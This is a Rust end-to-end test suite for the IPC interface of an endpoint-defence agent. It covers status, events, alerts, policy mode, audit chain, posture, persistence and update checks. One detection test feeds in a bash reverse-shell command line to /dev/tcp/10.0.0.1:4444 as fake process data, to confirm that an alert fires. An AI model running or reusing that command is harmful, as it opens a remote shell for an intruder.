use os_defender_core::{
    detection::{DetectionEngine, default_ruleset},
    events::{NormalizedEvent, OsType, Severity},
    health::BlindSpotDetector,
    ipc::{
        AgentStatus, IpcListener, IpcRequest, IpcResponse, IpcStream,
    },
    response::{AuditLog, PolicyEngine, PolicyMode},
    storage::SqliteStore,
};
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::Mutex;

struct TestAgentState {
    store: SqliteStore,
    engine: DetectionEngine,
    health: BlindSpotDetector,
    policy: PolicyEngine,
    #[allow(dead_code)]
    audit: AuditLog,
    events_processed: u64,
    alerts_generated: u64,
    actions_taken: u64,
}

fn setup_agent(dir: &std::path::Path) -> Arc<Mutex<TestAgentState>> {
    let db_path = dir.join("test.db");
    let store = SqliteStore::open(&db_path).unwrap();
    let engine = DetectionEngine::new(default_ruleset());
    let health = BlindSpotDetector::new(60);
    let policy = PolicyEngine::new(PolicyMode::DryRun);
    let audit = AuditLog::recover_chain(&store.connection());
    Arc::new(Mutex::new(TestAgentState {
        store,
        engine,
        health,
        policy,
        audit,
        events_processed: 0,
        alerts_generated: 0,
        actions_taken: 0,
    }))
}

async fn handle_request(
    state: &Arc<Mutex<TestAgentState>>,
    request: &IpcRequest,
) -> IpcResponse {
    match request {
        IpcRequest::Status => {
            let s = state.lock().await;
            IpcResponse::Status(AgentStatus {
                running: true,
                uptime_secs: 42,
                events_processed: s.events_processed,
                alerts_generated: s.alerts_generated,
                actions_taken: s.actions_taken,
                policy_mode: format!("{:?}", s.policy.mode()),
                collectors_active: vec!["test-collector".into()],
                version: "2.0.0-test".into(),
            })
        }
        IpcRequest::GetEvents { limit } => {
            let s = state.lock().await;
            match s.store.get_events(*limit) {
                Ok(events) => IpcResponse::Events(events),
                Err(e) => IpcResponse::Error {
                    message: e.to_string(),
                },
            }
        }
        IpcRequest::GetAlerts { limit } => {
            let s = state.lock().await;
            match s.store.get_alerts(*limit) {
                Ok(alerts) => IpcResponse::Alerts(alerts),
                Err(e) => IpcResponse::Error {
                    message: e.to_string(),
                },
            }
        }
        IpcRequest::GetHealth => {
            let mut s = state.lock().await;
            let assessment = s.health.assess();
            IpcResponse::Health(assessment)
        }
        IpcRequest::GetAuditLog { limit } => {
            let s = state.lock().await;
            match AuditLog::get_recent(&s.store.connection(), *limit) {
                Ok(entries) => IpcResponse::AuditLog(entries),
                Err(e) => IpcResponse::Error {
                    message: e.to_string(),
                },
            }
        }
        IpcRequest::GetPolicyMode => {
            let s = state.lock().await;
            IpcResponse::PolicyMode(s.policy.mode())
        }
        IpcRequest::SetPolicyMode { mode } => {
            let mut s = state.lock().await;
            s.policy.set_mode(*mode);
            IpcResponse::Ok
        }
        IpcRequest::VerifyAuditChain => {
            let s = state.lock().await;
            match AuditLog::verify_chain(&s.store.connection()) {
                Ok((valid, entries)) => IpcResponse::AuditChainStatus { valid, entries },
                Err(e) => IpcResponse::Error {
                    message: e.to_string(),
                },
            }
        }
        IpcRequest::GetAiStatus => {
            let bridge = os_defender_core::advanced::ai_bridge::AiBridge::new(std::path::Path::new("/tmp"));
            IpcResponse::AiStatus(bridge.status())
        }
        IpcRequest::GetPosture => {
            let report =
                os_defender_core::advanced::posture::PostureAssessor::new("test").assess();
            IpcResponse::PostureReport(Box::new(report))
        }
        IpcRequest::GetPersistence => {
            let scanner =
                os_defender_core::advanced::persistence::LinuxPersistenceScanner::new();
            let entries = scanner.scan();
            IpcResponse::PersistenceEntries(entries)
        }
        IpcRequest::VerifyIntegrity => {
            let tp =
                os_defender_core::advanced::tamper::TamperProtection::new("2.0.0-test");
            let result = tp.verify();
            IpcResponse::IntegrityStatus(Box::new(result))
        }
        IpcRequest::CheckUpdate => {
            let checker = os_defender_core::update::UpdateChecker::new(
                "2.0.0-test",
                os_defender_core::update::UpdateConfig::default(),
            );
            IpcResponse::UpdateInfo(checker.no_update_info())
        }
        IpcRequest::Shutdown => IpcResponse::Ok,
        _ => IpcResponse::Error {
            message: "unhandled in test".into(),
        },
    }
}

async fn run_test_server(endpoint: String, state: Arc<Mutex<TestAgentState>>) {
    let listener = IpcListener::bind(&endpoint).await.unwrap();
    loop {
        let stream = match listener.accept().await {
            Ok(s) => s,
            Err(_) => break,
        };
        let state = Arc::clone(&state);
        tokio::spawn(async move {
            let (reader, mut writer) = tokio::io::split(stream);
            let mut lines = BufReader::new(reader).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                let req: IpcRequest = match serde_json::from_str(&line) {
                    Ok(r) => r,
                    Err(e) => {
                        let resp = IpcResponse::Error {
                            message: format!("parse error: {e}"),
                        };
                        let mut json = serde_json::to_string(&resp).unwrap();
                        json.push('\n');
                        let _ = writer.write_all(json.as_bytes()).await;
                        continue;
                    }
                };
                let resp = handle_request(&state, &req).await;
                let mut json = serde_json::to_string(&resp).unwrap();
                json.push('\n');
                let _ = writer.write_all(json.as_bytes()).await;
            }
        });
    }
}

async fn send_and_recv(endpoint: &str, request: &IpcRequest) -> IpcResponse {
    let stream = IpcStream::connect(endpoint).await.unwrap();
    let (reader, mut writer) = tokio::io::split(stream);

    let mut json = serde_json::to_string(request).unwrap();
    json.push('\n');
    writer.write_all(json.as_bytes()).await.unwrap();
    writer.flush().await.unwrap();

    let mut lines = BufReader::new(reader).lines();
    let line = lines.next_line().await.unwrap().unwrap();
    serde_json::from_str(&line).unwrap()
}

#[tokio::test]
async fn e2e_status_roundtrip() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));

    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::Status).await;
    match resp {
        IpcResponse::Status(s) => {
            assert!(s.running);
            assert_eq!(s.version, "2.0.0-test");
            assert_eq!(s.uptime_secs, 42);
            assert!(s.collectors_active.contains(&"test-collector".to_string()));
        }
        other => panic!("expected Status, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_event_ingest_and_retrieve() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_events.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    // Ingest events directly into the store
    {
        let mut s = state.lock().await;
        let event = NormalizedEvent::new(
            "test-endpoint".into(),
            OsType::Linux,
            os_defender_core::events::EventType::Process,
            Severity::Info,
        );
        s.store.insert_event(&event).unwrap();
        s.events_processed += 1;
    }

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Retrieve via IPC
    let resp = send_and_recv(&endpoint, &IpcRequest::GetEvents { limit: 10 }).await;
    match resp {
        IpcResponse::Events(events) => {
            assert_eq!(events.len(), 1);
            assert_eq!(events[0].endpoint_id, "test-endpoint");
        }
        other => panic!("expected Events, got {other:?}"),
    }

    // Status should reflect the processed event
    let resp = send_and_recv(&endpoint, &IpcRequest::Status).await;
    match resp {
        IpcResponse::Status(s) => assert_eq!(s.events_processed, 1),
        other => panic!("expected Status, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_policy_mode_get_and_set() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_policy.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Default is DryRun
    let resp = send_and_recv(&endpoint, &IpcRequest::GetPolicyMode).await;
    match resp {
        IpcResponse::PolicyMode(m) => assert_eq!(m, PolicyMode::DryRun),
        other => panic!("expected PolicyMode, got {other:?}"),
    }

    // Change to Execute
    let resp = send_and_recv(
        &endpoint,
        &IpcRequest::SetPolicyMode {
            mode: PolicyMode::Execute,
        },
    )
    .await;
    assert!(matches!(resp, IpcResponse::Ok));

    // Confirm changed
    let resp = send_and_recv(&endpoint, &IpcRequest::GetPolicyMode).await;
    match resp {
        IpcResponse::PolicyMode(m) => assert_eq!(m, PolicyMode::Execute),
        other => panic!("expected PolicyMode, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_health_assessment() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_health.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::GetHealth).await;
    match resp {
        IpcResponse::Health(assessment) => {
            // Fresh state with no heartbeats — health assessment should return
            assert!(assessment.caveat.len() > 0);
        }
        other => panic!("expected Health, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_audit_chain_integrity() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_audit.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Empty chain should be valid
    let resp = send_and_recv(&endpoint, &IpcRequest::VerifyAuditChain).await;
    match resp {
        IpcResponse::AuditChainStatus { valid, entries } => {
            assert!(valid);
            assert_eq!(entries, 0);
        }
        other => panic!("expected AuditChainStatus, got {other:?}"),
    }

    // Empty audit log
    let resp = send_and_recv(&endpoint, &IpcRequest::GetAuditLog { limit: 10 }).await;
    match resp {
        IpcResponse::AuditLog(entries) => assert_eq!(entries.len(), 0),
        other => panic!("expected AuditLog, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_ai_status() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_ai.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::GetAiStatus).await;
    match resp {
        IpcResponse::AiStatus(ai) => {
            assert!(!ai.available);
            assert!(!ai.model_loaded);
        }
        other => panic!("expected AiStatus, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_posture_assessment() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_posture.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::GetPosture).await;
    match resp {
        IpcResponse::PostureReport(report) => {
            assert!(!report.grade.is_empty());
            assert!(report.checks.len() > 0);
        }
        other => panic!("expected PostureReport, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_persistence_scan() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_persist.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::GetPersistence).await;
    match resp {
        IpcResponse::PersistenceEntries(entries) => {
            // On a real system, at least some persistence entries should be found
            // (systemd services, cron, etc.)
            let _ = entries; // may be empty or populated depending on system
        }
        other => panic!("expected PersistenceEntries, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_integrity_verification() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_integrity.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::VerifyIntegrity).await;
    match resp {
        IpcResponse::IntegrityStatus(_result) => {
            // Without a recorded manifest, integrity check will report missing files
            // The important thing is it didn't error
        }
        other => panic!("expected IntegrityStatus, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_shutdown_request() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_shutdown.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::Shutdown).await;
    assert!(matches!(resp, IpcResponse::Ok));

    srv.abort();
}

#[tokio::test]
async fn e2e_invalid_request_returns_error() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_invalid.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Send malformed JSON
    let stream = IpcStream::connect(&endpoint).await.unwrap();
    let (reader, mut writer) = tokio::io::split(stream);

    writer
        .write_all(b"{\"type\":\"NonExistentRequest\"}\n")
        .await
        .unwrap();

    let mut lines = BufReader::new(reader).lines();
    let line = lines.next_line().await.unwrap().unwrap();
    let resp: IpcResponse = serde_json::from_str(&line).unwrap();
    match resp {
        IpcResponse::Error { message } => {
            assert!(message.contains("parse error") || message.contains("unknown variant"));
        }
        other => panic!("expected Error, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_concurrent_clients() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("e2e_conc.sock").to_string_lossy().into_owned();
    let state = setup_agent(dir.path());

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let mut handles = vec![];
    for i in 0..5 {
        let ep = endpoint.clone();
        handles.push(tokio::spawn(async move {
            let resp = send_and_recv(&ep, &IpcRequest::Status).await;
            match resp {
                IpcResponse::Status(s) => {
                    assert!(s.running, "client {i} got non-running status");
                }
                other => panic!("client {i}: expected Status, got {other:?}"),
            }
        }));
    }

    for h in handles {
        h.await.unwrap();
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_detection_pipeline_through_ipc() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir
        .path()
        .join("e2e_detect.sock")
        .to_string_lossy()
        .into_owned();
    let state = setup_agent(dir.path());

    // Simulate a suspicious process event going through the detection engine
    {
        let mut s = state.lock().await;
        let mut event = NormalizedEvent::new(
            "test-endpoint".into(),
            OsType::Linux,
            os_defender_core::events::EventType::Process,
            Severity::Info,
        );
        event.process_context = Some(os_defender_core::events::ProcessContext {
            pid: 1234,
            ppid: Some(1),
            name: "bash".into(),
            exe: Some("/usr/bin/bash".into()),
            cmdline: Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".into()),
            uid: Some(1000),
            username: Some("attacker".into()),
            start_time: None,
            children_pids: vec![],
        });

        let alerts = s.engine.process_event(&event);
        s.store.insert_event(&event).unwrap();
        for alert in &alerts {
            s.store.insert_alert(alert).unwrap();
        }
        s.events_processed += 1;
        s.alerts_generated += alerts.len() as u64;
    }

    let ep = endpoint.clone();
    let srv = tokio::spawn(run_test_server(ep, Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Verify events are retrievable
    let resp = send_and_recv(&endpoint, &IpcRequest::GetEvents { limit: 10 }).await;
    match resp {
        IpcResponse::Events(events) => {
            assert_eq!(events.len(), 1);
            let ev = &events[0];
            assert_eq!(ev.process_context.as_ref().unwrap().name, "bash");
        }
        other => panic!("expected Events, got {other:?}"),
    }

    // Verify alerts are retrievable
    let resp = send_and_recv(&endpoint, &IpcRequest::GetAlerts { limit: 10 }).await;
    match resp {
        IpcResponse::Alerts(alerts) => {
            assert!(!alerts.is_empty(), "detection engine should have generated alerts");
            let a = &alerts[0];
            assert!(!a.title.is_empty());
            assert!(a.confidence > 0.0);
        }
        other => panic!("expected Alerts, got {other:?}"),
    }

    // Verify status shows the alert
    let resp = send_and_recv(&endpoint, &IpcRequest::Status).await;
    match resp {
        IpcResponse::Status(s) => {
            assert_eq!(s.events_processed, 1);
            assert!(s.alerts_generated > 0, "detection engine should have generated alerts");
        }
        other => panic!("expected Status, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_get_alerts_empty() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("alerts_empty.sock").to_string_lossy().to_string();
    let state = setup_agent(dir.path());
    let srv = tokio::spawn(run_test_server(endpoint.clone(), Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::GetAlerts { limit: 10 }).await;
    match resp {
        IpcResponse::Alerts(alerts) => assert!(alerts.is_empty()),
        other => panic!("expected Alerts, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_ai_status_reflects_state() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("ai_real.sock").to_string_lossy().to_string();
    let state = setup_agent(dir.path());
    let srv = tokio::spawn(run_test_server(endpoint.clone(), Arc::clone(&state)));
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::GetAiStatus).await;
    match resp {
        IpcResponse::AiStatus(ai) => {
            // No ONNX model in temp dir, so model_loaded should be false
            assert!(!ai.model_loaded);
            assert!(!ai.available);
            assert_eq!(ai.events_scored, 0);
        }
        other => panic!("expected AiStatus, got {other:?}"),
    }

    srv.abort();
}

#[tokio::test]
async fn e2e_check_update() {
    let dir = tempfile::tempdir().unwrap();
    let endpoint = dir.path().join("update.sock").to_string_lossy().to_string();
    let state = setup_agent(dir.path());
    let srv = tokio::spawn(run_test_server(endpoint.clone(), Arc::clone(&state)));

    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let resp = send_and_recv(&endpoint, &IpcRequest::CheckUpdate).await;
    match resp {
        IpcResponse::UpdateInfo(info) => {
            assert_eq!(info.current_version, "2.0.0-test");
            assert!(!info.update_available);
            assert!(info.latest_version.is_none());
        }
        other => panic!("expected UpdateInfo, got {other:?}"),
    }

    srv.abort();
}
